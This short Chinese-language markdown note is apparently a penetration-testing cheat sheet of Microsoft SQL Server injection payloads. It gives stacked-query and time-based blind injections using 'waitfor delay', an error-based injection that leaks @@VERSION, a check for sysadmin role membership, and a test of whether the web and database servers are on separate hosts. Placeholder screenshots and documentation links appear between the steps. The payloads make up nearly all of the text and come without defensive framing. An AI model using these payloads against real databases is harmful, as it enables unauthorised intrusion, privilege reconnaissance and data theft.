### 0、堆叠查询+时间盲注检测漏洞是否存在
```
select session_id from sys.dm_exec_requests where session_id=12; waitfor delay '0:0:5'--
```
![image](./pic/0.png)

### 1、报错注入查询数据库版本
```
select session_id,command from sys.dm_exec_requests where session_id=12 or 1=@@VERSION;
```
![image](./pic/1.png)

### 2、堆叠查询+时间盲注查询当前用户是否为dba
```
select session_id,command from sys.dm_exec_requests where session_id=12;if(1=(select is_srvrolemember('sysadmin'))) waitfor delay '0:0:5'--
```
![image](./pic/2.png)

### 3、堆叠查询+时间盲注查询是否站库分离
```
select session_id from sys.dm_exec_requests where session_id=12;if(host_name()=@@servername)waitfor delay '0:0:5';--
host_name()：连接数据库管理系统的工作站所在机器的计算机名
@@servername：数据库管理系统所在机器的计算机名
参考链接：
https://docs.microsoft.com/en-us/sql/t-sql/functions/host-name-transact-sql?view=sql-server-ver15
https://docs.microsoft.com/en-us/sql/t-sql/functions/servername-transact-sql?view=sql-server-ver15
```
![image](./pic/3.png)
